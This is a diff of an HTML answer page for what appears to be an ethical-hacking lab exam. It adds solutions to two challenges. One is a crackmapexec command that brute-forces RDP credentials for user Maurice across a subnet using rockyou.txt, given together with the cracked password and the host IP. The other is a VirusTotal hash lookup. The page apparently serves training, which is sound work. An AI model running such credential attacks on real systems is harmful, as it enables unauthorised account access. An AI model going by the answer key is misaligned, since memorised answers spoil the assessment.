@@ -288,16 +288,17 @@ docker run -d -p 443:443 --name openvas mikesplain/openvas</p>
         <ul>Once you have a shell you can go to C:\Users\Public\Downloads and find the answer to the challenge</ul>
         <ul>The file MSS.txt is 7 bytes !</ul>
     </ol></p>
-
-    
-
-Challenge 9:
-
-You are assigned to crack RDP credentials of user Maurice from the target subnet 192.168.10.0/24 and determine the password as answer. Note: use Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: Aaaaaaa@NNNN)
-
-Challenge 10:
-
-You are assigned to perform malware scanning on a malware file Tools.rar stored in Downloads folder of EH workstation-2 machine and determine the last four digits of the file’s SHA-256 hash value. (Format: aNNN)
+<p>Challenge 9:</p>
+<p>You are assigned to crack RDP credentials of user Maurice from the target subnet 192.168.10.0/24 and determine the password as answer. Note: use Note: use users.txt and rockyou.txt files stored in attacker 
+    home directory while cracking the credentials. (Format: Aaaaaaa@NNNN)</p>
+    <p>Answer: CrackMapExec comes to the rescue in situations where you want to scan a complete subnet for existence of a specific user account. It's password spraying!</p>
+    <p><ol>
+        <ul>crackmapexec rdp 192.168.10.0/24 -u Maurice -p /home/attacker/rockyou.txt</ul>
+        <ul>answer: the rdp password for Maurice is Pumpkin@1234 and his IP address is 192.168.10.222</ul>
+    </ol></p>
+<p>Challenge 10:</p>
+    <p>You are assigned to perform malware scanning on a malware file Tools.rar stored in Downloads folder of EH workstation-2 machine and determine the last four digits of the file’s SHA-256 hash value. (Format: aNNN)</p>
+    <p>Answer: this one is easy, open the webbrowser and go to virustotal. Upload the file and click DETAILS. The answer to this question is d282.</p>
 
 Challenge 11:
 
